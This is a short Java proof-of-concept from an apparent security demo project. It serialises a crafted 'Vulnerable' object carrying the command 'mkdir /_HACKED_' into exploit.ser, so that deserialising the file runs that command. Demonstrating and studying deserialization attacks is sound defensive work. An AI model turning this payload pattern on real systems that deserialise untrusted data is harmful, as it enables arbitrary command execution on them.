package com.ttulka.security;

import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

import com.ttulka.security.sample.Vulnerable;

public class ExploitExternal extends Exploit {

    public ExploitExternal(String cmd) {
        super(cmd);
    }

    public static void main(String[] args) throws Exception {
        Vulnerable vulnerable = new Vulnerable();
        vulnerable.setObject(new Object());
        vulnerable.setProperty("ignored");

        Vulnerable exploited = new Exploit("mkdir /_HACKED_")
                .exploited(vulnerable);

        try (OutputStream fos = Files.newOutputStream(Paths.get("exploit.ser"));
             ObjectOutputStream oos = new ObjectOutputStream(fos)) {

            oos.writeObject(exploited);
            oos.flush();
        }
    }
}
